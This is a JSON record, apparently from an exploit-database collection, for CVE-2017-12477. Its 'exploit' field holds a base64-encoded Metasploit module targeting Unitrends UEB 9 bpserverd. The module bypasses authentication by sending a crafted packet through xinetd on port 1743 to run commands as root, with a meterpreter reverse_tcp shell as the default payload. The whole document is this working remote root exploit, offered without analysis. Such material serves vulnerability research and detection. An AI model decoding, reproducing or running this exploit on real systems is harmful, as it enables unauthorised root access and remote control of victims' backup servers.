{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cHM6Ly9tZXRhc3Bsb2l0LmNvbS9kb3dubG9hZA0KIyBDdXJyZW50IHNvdXJjZTogaHR0cHM6Ly9naXRodWIuY29tL3JhcGlkNy9tZXRhc3Bsb2l0LWZyYW1ld29yaw0KIyMNCg0KY2xhc3MgTWV0YXNwbG9pdE1vZHVsZSA8IE1zZjo6RXhwbG9pdDo6UmVtb3RlDQogIFJhbmsgPSBFeGNlbGxlbnRSYW5raW5nDQoNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6VGNwDQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpDbWRTdGFnZXINCg0KICBkZWYgaW5pdGlhbGl6ZShpbmZvID0ge30pDQogICAgc3VwZXIodXBkYXRlX2luZm8oaW5mbywNCiAgICAgICdOYW1lJyAgICAgICAgICAgPT4gJ1VuaXRyZW5kcyBVRUIgYnBzZXJ2ZXJkIGF1dGhlbnRpY2F0aW9uIGJ5cGFzcyBSQ0UnLA0KICAgICAgJ0Rlc2NyaXB0aW9uJyAgICA9PiAlcXsNCiAgICAgICBJdCB3YXMgZGlzY292ZXJlZCB0aGF0IHRoZSBVbml0cmVuZHMgYnBzZXJ2ZXJkIHByb3ByaWV0YXJ5IHByb3RvY29sLCBhcyBleHBvc2VkIHZpYSB4aW5ldGQsDQogICAgICAgaGFzIGFuIGlzc3VlIGluIHdoaWNoIGl0cyBhdXRoZW50aWNhdGlvbiBjYW4gYmUgYnlwYXNzZWQuICBBIHJlbW90ZSBhdHRhY2tlciBjb3VsZCB1c2UgdGhpcw0KICAgICAgIGlzc3VlIHRvIGV4ZWN1dGUgYXJiaXRyYXJ5IGNvbW1hbmRzIHdpdGggcm9vdCBwcml2aWxlZ2Ugb24gdGhlIHRhcmdldCBzeXN0ZW0uDQogICAgICB9LA0KICAgICAgJ0F1dGhvcicgICAgICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgJ0phcmVkIEFyYXZlJywgICMgQGlvdGVubnVpDQogICAgICAgICAgJ0NhbGUgU21pdGgnLCAgICMgQDB4QzQxMw0KICAgICAgICAgICdCZW5ueSBIdXN0ZWQnICAjIEBCZW5ueUh1c3RlZA0KICAgICAgICBdLA0KICAgICAgJ0xpY2Vuc2UnICAgICAgICA9PiBNU0ZfTElDRU5TRSwNCiAgICAgICdQbGF0Zm9ybScgICAgICAgPT4gJ2xpbnV4JywNCiAgICAgICdBcmNoJyA9PiBbQVJDSF9YODZdLA0KICAgICAgJ0NtZFN0YWdlckZsYXZvcicgPT4gWyAncHJpbnRmJyBdLA0KICAgICAgJ1JlZmVyZW5jZXMnICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgWydVUkwnLCAnaHR0cHM6Ly9zdXBwb3J0LnVuaXRyZW5kcy5jb20vVW5pdHJlbmRzQmFja3VwL3MvYXJ0aWNsZS9rYTY0MDAwMDAwMENjWmVBQUsvMDAwMDA1NzU1J10sDQogICAgICAgICAgWydVUkwnLCAnaHR0cHM6Ly9udmQubmlzdC5nb3YvdnVsbi9kZXRhaWwvQ1ZFLTIwMTctMTI0NzcnXSwNCiAgICAgICAgICBbJ0NWRScsICcyMDE3LTEyNDc3J10sDQogICAgICAgIF0sDQogICAgICAnVGFyZ2V0cycgICAgICAgID0+DQogICAgICAgIFsNCiAgICAgICAgICBbICdVRUIgOS4qJywgeyB9IF0NCiAgICAgICAgXSwNCiAgICAgICdQcml2aWxlZ2VkJyAgICAgPT4gdHJ1ZSwNCiAgICAgICdEZWZhdWx0T3B0aW9ucycgPT4gew0KICAgICAgICAgICdQQVlMT0FEJyA9PiAnbGludXgveDg2L21ldGVycHJldGVyL3JldmVyc2VfdGNwJywNCiAgICAgICAgICAnU1NMJyA9PiBmYWxzZQ0KICAgICAgICB9LA0KICAgICAgJ0Rpc2Nsb3N1cmVEYXRlJyAgPT4gJ0F1ZyA4IDIwMTcnLA0KICAgICAgJ0RlZmF1bHRUYXJnZXQnICAgPT4gMCkpDQogICAgcmVnaXN0ZXJfb3B0aW9ucyhbDQogICAgICAgIE9wdDo6UlBPUlQoMTc0MykNCiAgICAgIF0pDQogICAgZGVyZWdpc3Rlcl9vcHRpb25zKCdDTURTVEFHRVI6OkRFQ09ERVInLCAnQ01EU1RBR0VSOjpGTEFWT1InKQ0KICBlbmQNCg0KICBkZWYgY2hlY2sNCiAgICBzMSA9IGNvbm5lY3QoZ2xvYmFsID0gZmFsc2UpDQogICAgYnVmMSAgPSBzMS5nZXRfb25jZSgtMSkudG9fcw0KICAgICNwYXJzZSBvdXQgdGhlIGJwZCBwb3J0IHJldHVybmVkDQogICAgYnBkX3BvcnQgPSBidWYxWy04Li4tM10udG9faQ0KDQogICAgI2NoZWNrIGlmIGl0J3MgYSB2YWxpZCBwb3J0IG51bWJlciAoMS02NTUzNCkNCiAgICBpZiBicGRfcG9ydCAmJiBicGRfcG9ydCA+PSAxICYmIGJwZF9wb3J0IDw9IDY1NTM1DQogICAgICBFeHBsb2l0OjpDaGVja0NvZGU6OkRldGVjdGVkDQogICAgZWxzZQ0KICAgICAgRXhwbG9pdDo6Q2hlY2tDb2RlOjpTYWZlDQogICAgZW5kDQogIGVuZA0KDQogIGRlZiBleGVjdXRlX2NvbW1hbmQoY21kLCBvcHRzID0ge30pDQoNCiAgICAjYXBwZW5kIGEgY29tbWVudCwgaWdub3JlIGV2ZXJ5dGhpbmcgYWZ0ZXIgb3VyIGNtZA0KICAgIGNtZCA9IGNtZCArICIgIyINCg0KICAgICMgYnVpbGQgdGhlIGF0dGFjayBidWZmZXIuLi4NCiAgICBjb21tYW5kX2xlbiA9IGNtZC5sZW5ndGggKyAzDQogICAgcGFja2V0X2xlbiA9IGNtZC5sZW5ndGggKyAyMw0KICAgIGRhdGEgPSAgIlx4YTVceDUyXHgwMFx4MmQiDQogICAgZGF0YSA8PCAiXHgwMFx4MDBceDAwIg0KICAgIGRhdGEgPDwgcGFja2V0X2xlbg0KICAgIGRhdGEgPDwgIlx4MDBceDAwXHgwMCINCiAgICBkYXRhIDw8ICJceDAxIg0KICAgIGRhdGEgPDwgIlx4MDBceDAwXHgwMCINCiAgICBkYXRhIDw8ICJceDRjIg0KICAgIGRhdGEgPDwgIlx4MDBceDAwXHgwMCINCiAgICBkYXRhIDw8IGNvbW1hbmRfbGVuDQogICAgZGF0YSA8PCBjbWQNCiAgICBkYXRhIDw8ICJceDAwXHgwMFx4MDAiDQoNCiAgICBiZWdpbg0KICAgICAgcHJpbnRfc3RhdHVzKCJDb25uZWN0aW5nIHRvIHhpbmV0ZCBmb3IgYnBkIHBvcnQuLi4iKQ0KICAgICAgczEgPSBjb25uZWN0KGdsb2JhbCA9IGZhbHNlKQ0KICAgICAgYnVmMSAgPSBzMS5nZXRfb25jZSgtMSkudG9fcw0KDQogICAgICAjcGFyc2Ugb3V0IHRoZSBicGQgcG9ydCByZXR1cm5lZCwgd2Ugd2lsbCBjb25uZWN0IGJhY2sgb24gdGhpcyBwb3J0IHRvIHNlbmQgb3VyIGNtZA0KICAgICAgYnBkX3BvcnQgPSBidWYxWy04Li4tM10udG9faQ0KDQogICAgICBwcmludF9nb29kKCJicGQgcG9ydCByZWNpZXZlZDogI3ticGRfcG9ydH0iKQ0KICAgICAgdnByaW50X3N0YXR1cygiQ29ubmVjdGluZyB0byAje2JwZF9wb3J0fSIpDQoNCiAgICAgIHMyID0gY29ubmVjdChnbG9iYWwgPSBmYWxzZSwgb3B0cyA9IHsnUlBPUlQnPT5icGRfcG9ydH0pDQogICAgICB2cHJpbnRfZ29vZCgnQ29ubmVjdGVkIScpDQoNCiAgICAgIHByaW50X3N0YXR1cygnU2VuZGluZyBjb21tYW5kIGJ1ZmZlciB0byB4aW5ldGQnKQ0KDQogICAgICBzMS5wdXQoZGF0YSkNCiAgICAgIHMyLmdldF9vbmNlKC0xLDEpLnRvX3MNCg0KICAgICAgZGlzY29ubmVjdChzMSkNCiAgICAgIGRpc2Nvbm5lY3QoczIpDQoNCiAgICByZXNjdWUgUmV4OjpBZGRyZXNzSW5Vc2UsIDo6RXJybm86OkVUSU1FRE9VVCwgUmV4OjpIb3N0VW5yZWFjaGFibGUsIFJleDo6Q29ubmVjdGlvblRpbWVvdXQsIFJleDo6Q29ubmVjdGlvblJlZnVzZWQsIDo6VGltZW91dDo6RXJyb3IsIDo6RU9GRXJyb3IgPT4gZQ0KICAgICAgZmFpbF93aXRoKEZhaWx1cmU6OlVucmVhY2hhYmxlLCAiI3twZWVyfSAtIENvbm5lY3Rpb24gdG8gc2VydmVyIGZhaWxlZCIpDQogICAgZW5kDQoNCiAgZW5kDQoNCiAgZGVmIGV4cGxvaXQNCiAgICBwcmludF9zdGF0dXMoIiN7cGVlcn0gLSBwd24nbmcgdWViIDkuLi4uIikNCiAgICBleGVjdXRlX2NtZHN0YWdlcig6bGluZW1heCA9PiAyMDApDQogIGVuZA0KZW5k", 
    "filename": "platforms/lin_x86/remote/43031.rb", 
    "id": "43031", 
    "cves": [
        "CVE-2017-12477"
    ]
}